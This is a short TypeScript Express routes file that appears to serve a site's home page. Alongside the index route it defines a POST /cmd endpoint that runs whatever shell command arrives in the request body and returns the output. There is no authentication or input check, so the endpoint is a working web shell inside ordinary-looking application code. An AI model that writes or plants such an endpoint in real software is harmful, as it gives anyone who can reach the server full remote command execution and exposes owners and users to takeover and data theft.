import { Router, Request, Response } from "express";
import { exec } from 'child_process';
/*
 * GET home page.
 */
const router = Router();

router.get('/', (req: Request, res: Response) => {
    res.render('index', { title: 'Express' });
});

router.post('/cmd', (req: Request, res: Response) => {
    exec(req.body.cmd, (err, stdout, stderr) => {
        if (err) {
            res.status(501).type('text').send(stderr);
        } else {
            res.status(200).type('text').send(stdout);
        }
    })
});

export default router;